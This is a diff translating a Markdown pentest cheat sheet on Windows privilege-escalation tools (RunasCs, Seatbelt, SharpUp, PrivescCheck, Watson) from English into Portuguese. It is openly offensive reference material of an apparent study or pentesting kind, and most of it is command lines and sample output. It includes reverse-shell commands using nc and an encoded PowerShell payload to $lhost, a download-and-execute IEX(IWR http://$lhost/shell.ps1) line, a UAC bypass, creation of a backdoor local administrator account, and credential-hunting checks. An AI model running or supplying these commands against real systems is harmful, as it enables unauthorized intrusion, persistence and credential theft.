@@ -1,6 +1,6 @@
-# Windows Privilege Escalation Tools
+# Ferramentas de Escalação de Privilégios Windows
 
-## Table of Contents
+## Índice
 
 - [RunasCs](#runascs)
 - [Seatbelt](#seatbelt)
@@ -13,54 +13,54 @@
 
 ## RunasCs
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```cmd
-:: Quick privesc enumeration
+:: Enumeração rápida de privesc
 winPEASx64.exe quiet && Seatbelt.exe -group=all
 ```
 
 > <https://github.com/antonioCoco/RunasCs>
 
-RunasCs is a utility to run commands with different user credentials. Works even when logon type 2 (interactive) is not allowed.
+RunasCs é um utilitário para executar comandos com credenciais de outros usuários. Funciona mesmo quando o logon tipo 2 (interativo) não é permitido.
 
 ### Download
 
 ```powershell
-# Transfer to target
+# Transferir para o alvo
 curl http://$lhost/RunasCs.exe -o RunasCs.exe
 ```
 
-### Basic Usage
+### Uso Básico
 
-> Run command as another user
+> Executar comando como outro usuário
 
 ```cmd
 RunasCs.exe $username $password "cmd /c whoami"
 ```
 
-> Run with domain user
+> Executar com usuário de domínio
 
 ```cmd
 RunasCs.exe $username $password "cmd /c whoami" -d $domain
 ```
 
-> Interactive cmd shell
+> Shell cmd interativo
 
 ```cmd
 RunasCs.exe $username $password cmd.exe
 ```
 
-### Logon Types
+### Tipos de Logon
 
-| Type | Flag | Description |
+| Tipo | Flag | Descrição |
 | :--- | :--- | :--- |
-| 2 | (default) | Interactive |
-| 3 | `-l 3` | Network |
+| 2 | (padrão) | Interativo |
+| 3 | `-l 3` | Rede |
 | 8 | `-l 8` | NetworkCleartext |
 | 9 | `-l 9` | NewCredentials (runas /netonly) |
 
-> Using network logon type
+> Usar tipo de logon de rede
 
 ```cmd
 RunasCs.exe $username $password "cmd /c dir \\\\dc01\\c$" -l 9
@@ -68,41 +68,41 @@ RunasCs.exe $username $password "cmd /c dir \\\\dc01\\c$" -l 9
 
 ### Reverse Shell
 
-> Execute reverse shell as user
+> Executar reverse shell como usuário
 
 ```cmd
 RunasCs.exe $username $password "powershell -e $base64_payload"
 ```
 
-> With nc
+> Com nc
 
 ```cmd
 RunasCs.exe $username $password "C:\temp\nc.exe $lhost $lport -e cmd.exe"
 ```
 
-### Remote Connection
+### Conexão Remota
 
-> Create session with remote target
+> Criar sessão com alvo remoto
 
 ```cmd
 RunasCs.exe $username $password cmd.exe -r $lhost:$lport
 ```
 
-> Bypass UAC
+> Bypass de UAC
 
 ```cmd
 RunasCs.exe $username $password cmd.exe -r $lhost:$lport --bypass-uac
 ```
 
-### Examples
+### Exemplos
 
-> Run as local admin
+> Executar como admin local
 
 ```cmd
 RunasCs.exe Administrator "P@ssw0rd!" "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"
 ```
 
-> Domain authentication
+> Autenticação de domínio
 
 ```cmd
 RunasCs.exe john.doe "Password123" "powershell -ep bypass -c IEX(IWR http://$lhost/shell.ps1)" -d CORP
@@ -114,17 +114,17 @@ RunasCs.exe john.doe "Password123" "powershell -ep bypass -c IEX(IWR http://$lho
 
 > <https://github.com/GhostPack/Seatbelt>
 
-Seatbelt is a C# project that performs security-oriented host reconnaissance.
+Seatbelt é um projeto C# que realiza reconhecimento de host orientado à segurança.
 
-### Seatbelt Basic Usage
+### Uso Básico do Seatbelt
 
-> Run all checks
+> Executar todas as verificações
 
 ```cmd
 Seatbelt.exe -group=all
 ```
 
-> Run specific group
+> Executar grupo específico
 
 ```cmd
 Seatbelt.exe -group=user
@@ -132,9 +132,9 @@ Seatbelt.exe -group=system
 Seatbelt.exe -group=misc
 ```
 
-### Common Checks
+### Verificações Comuns
 
-> Credential hunting
+> Caça a credenciais
 
 ```cmd
 Seatbelt.exe CredEnum
@@ -144,7 +144,7 @@ Seatbelt.exe KeePass
 Seatbelt.exe SecPackageCreds
 ```
 
-> Browser data
+> Dados de browser
 
 ```cmd
 Seatbelt.exe ChromiumBookmarks
@@ -153,7 +153,7 @@ Seatbelt.exe FirefoxHistory
 Seatbelt.exe InternetExplorerFavorites
 ```
 
-> Windows credentials
+> Credenciais Windows
 
 ```cmd
 Seatbelt.exe WindowsCredentialFiles
@@ -163,7 +163,7 @@ Seatbelt.exe PuttySessions
 Seatbelt.exe RDPSavedConnections
 ```
 
-> System info
+> Informações do sistema
 
 ```cmd
 Seatbelt.exe OSInfo
@@ -173,7 +173,7 @@ Seatbelt.exe ScheduledTasks
 Seatbelt.exe Services
 ```
 
-> Security settings
+> Configurações de segurança
 
 ```cmd
 Seatbelt.exe AuditSettings
@@ -183,15 +183,15 @@ Seatbelt.exe UAC
 Seatbelt.exe AntiVirus
 ```
 
-### Output Options
+### Opções de Saída
 
-> Output to file
+> Salvar em arquivo
 
 ```cmd
 Seatbelt.exe -group=all -outputfile=C:\temp\seatbelt.txt
 ```
 
-> Full output
+> Saída completa
 
 ```cmd
 Seatbelt.exe -group=all -full
@@ -203,25 +203,25 @@ Seatbelt.exe -group=all -full
 
 > <https://github.com/GhostPack/SharpUp>
 
-SharpUp is a C# port of PowerUp, focusing on privilege escalation checks.
+SharpUp é um port C# do PowerUp, focado em verificações de escalação de privilégios.
 
-### SharpUp Basic Usage
+### Uso Básico do SharpUp
 
-> Run all checks
+> Executar todas as verificações
 
 ```cmd
 SharpUp.exe
 ```
 
-> Audit mode (all checks regardless of admin status)
+> Modo auditoria (todas as verificações independente do status de admin)
 
 ```cmd
 SharpUp.exe audit
 ```
 
-### Specific Checks
+### Verificações Específicas
 
-> Service-based escalation
+> Escalação via serviços
 
 ```cmd
 SharpUp.exe ModifiableServices
@@ -229,20 +229,20 @@ SharpUp.exe ModifiableServiceBinaries
 SharpUp.exe UnquotedServicePath
 ```
 
-> Registry-based
+> Via registro
 
 ```cmd
 SharpUp.exe AlwaysInstallElevated
 SharpUp.exe ModifiableRegistryAutoRun
 ```
 
-> Scheduled tasks
+> Tarefas agendadas
 
 ```cmd
 SharpUp.exe ModifiableScheduledTask
 ```
 
-> Cached credentials
+> Credenciais em cache
 
 ```cmd
 SharpUp.exe CachedGPPPassword
@@ -255,21 +255,21 @@ SharpUp.exe HijackablePaths
 SharpUp.exe ProcessDLLHijack
 ```
 
-### Output
+### Exemplo de Saída
 
 ```cmd
-=== SharpUp: Running Privilege Escalation Checks ===
+=== SharpUp: Executando Verificações de Escalação de Privilégios ===
 
-[*] In medium integrity but user is a local administrator- UAC can be bypassed.
+[*] Em integridade média mas usuário é admin local — UAC pode ser bypassado.
 
-=== Modifiable Services ===
-Service: VulnService
+=== Serviços Modificáveis ===
+Serviço: ServicoVulneravel
   StartName: LocalSystem
-  Permissions: ChangeConfig, Start, Stop
+  Permissões: ChangeConfig, Start, Stop
 
-=== Unquoted Service Paths ===
-Service: BadService
-  Binary Path: C:\Program Files\Vuln App\service.exe
+=== Caminhos de Serviço sem Aspas ===
+Serviço: ServicoRuim
+  Caminho do Binário: C:\Program Files\App Vuln\service.exe
 ```
 
 ---
@@ -278,33 +278,33 @@ Service: BadService
 
 > <https://github.com/itm4n/PrivescCheck>
 
-### Usage
+### Uso
 
 ```powershell
-# Import
+# Importar
 . .\PrivescCheck.ps1
 
-# Run all checks
+# Executar todas as verificações
 Invoke-PrivescCheck
 
-# Extended checks
+# Verificações estendidas
 Invoke-PrivescCheck -Extended
 
-# Export report
+# Exportar relatório
 Invoke-PrivescCheck -Report PrivescCheck -Format HTML
 Invoke-PrivescCheck -Report PrivescCheck -Format CSV
 ```
 
-### Specific Categories
+### Categorias Específicas
 
 ```powershell
-# Only credentials
+# Apenas credenciais
 Invoke-PrivescCheck -Credential
 
-# Only services
+# Apenas serviços
 Invoke-PrivescCheck -Service
 
-# Only scheduled tasks
+# Apenas tarefas agendadas
 Invoke-PrivescCheck -ScheduledTask
 ```
 
@@ -314,13 +314,13 @@ Invoke-PrivescCheck -ScheduledTask
 
 > <https://github.com/AlessandroZ/BeRoot>
 
-### BeRoot Usage
+### Uso do BeRoot
 
 ```cmd
 # Windows
 beRoot.exe
 
-# Check specific module
+# Verificar módulo específico
 beRoot.exe --list
 ```
 
@@ -330,61 +330,61 @@ beRoot.exe --list
 
 > <https://github.com/rasta-mouse/Watson>
 
-Watson is a .NET tool for finding privilege escalation vulnerabilities via missing patches.
+Watson é uma ferramenta .NET para encontrar vulnerabilidades de escalação de privilégios via patches ausentes.
 
-### Watson Usage
+### Uso do Watson
 
 ```cmd
 Watson.exe
 ```
 
-### Output Example
+### Exemplo de Saída
 
 ```text
-[*] OS Build Number: 17763
-[*] Enumerating installed KBs...
+[*] Número de Build do SO: 17763
+[*] Enumerando KBs instalados...
 
-[!] CVE-2019-1405 : VULNERABLE
+[!] CVE-2019-1405 : VULNERÁVEL
 [>] https://www.exploit-db.com/exploits/47684
 
-[!] CVE-2019-1322 : VULNERABLE
+[!] CVE-2019-1322 : VULNERÁVEL
 [>] https://www.exploit-db.com/exploits/47496
 ```
 
 ---
 
-## Quick Reference
+## Referência Rápida
 
-### Tool Selection
+### Seleção de Ferramenta
 
-| Task | Tool |
+| Tarefa | Ferramenta |
 | :--- | :--- |
-| Run command as another user | RunasCs |
-| General enumeration | Seatbelt |
-| Privesc checks | SharpUp, PrivescCheck |
-| Missing patches | Watson |
-| Credential hunting | Seatbelt |
+| Executar comando como outro usuário | RunasCs |
+| Enumeração geral | Seatbelt |
+| Verificações de privesc | SharpUp, PrivescCheck |
+| Patches ausentes | Watson |
+| Caça a credenciais | Seatbelt |
 
-### Common Workflow
+### Fluxo de Trabalho Comum
 
 ```cmd
-# 1. Quick privesc check
+# 1. Verificação rápida de privesc
 SharpUp.exe audit
 
-# 2. Detailed enumeration
+# 2. Enumeração detalhada
 Seatbelt.exe -group=all
 
-# 3. Check for missing patches
+# 3. Verificar patches ausentes
 Watson.exe
 
-# 4. If found credentials, use RunasCs
+# 4. Se encontrar credenciais, usar RunasCs
 RunasCs.exe admin "P@ssword" cmd.exe
 ```
 
-### File Locations
+### Locais de Arquivo
 
 ```text
-# Transfer tools
+# Locais para transferir ferramentas
 C:\Users\Public\
 C:\Windows\Temp\
 C:\Windows\Tasks\
@@ -393,16 +393,16 @@ C:\Windows\Tasks\
 
 ---
 
-## 📚 See Also
+## 📚 Veja Também
 
-### Related Privilege Escalation
+### Escalação de Privilégios Relacionada
 
-- **[Privilege Escalation Windows](4.1.Privilege-Escalation-Windows.md)** - Complete Windows privesc methodology
-- **[Potato Exploits](4.5.Potato-Exploits.md)** - Token impersonation (JuicyPotato, PrintSpoofer, GodPotato)
-- **[LOLBAS Windows](4.4.LOLBAS-Windows.md)** - Native Windows binary abuse
+- **[Escalação de Privilégios Windows](Privilege-Escalation-Windows.md)** — Metodologia completa de privesc no Windows
+- **[Potato Exploits](Potato-Exploits.md)** — Impersonação de token (JuicyPotato, PrintSpoofer, GodPotato)
+- **[LOLBAS Windows](LOLBAS-Windows.md)** — Abuso de binários nativos do Windows
 
-### Related Topics
+### Tópicos Relacionados
 
-- **[Windows Command](../6.OS-Command/6.1.Windows-command.md)** - Windows enumeration commands
-- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - Credential attacks after enumeration
-- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Post-exploitation movement
+- **[Comandos Windows](../6.OS-Command/6.1.Windows-command.md)** — Comandos de enumeração Windows
+- **[Ataques de Senha](../3.AD-Exploit/3.2.Password-Attacks.md)** — Ataques de credenciais após enumeração
+- **[Movimentação Lateral](../5.Lateral-Movement/5.1.Lateral-Movement.md)** — Movimentação pós-exploração
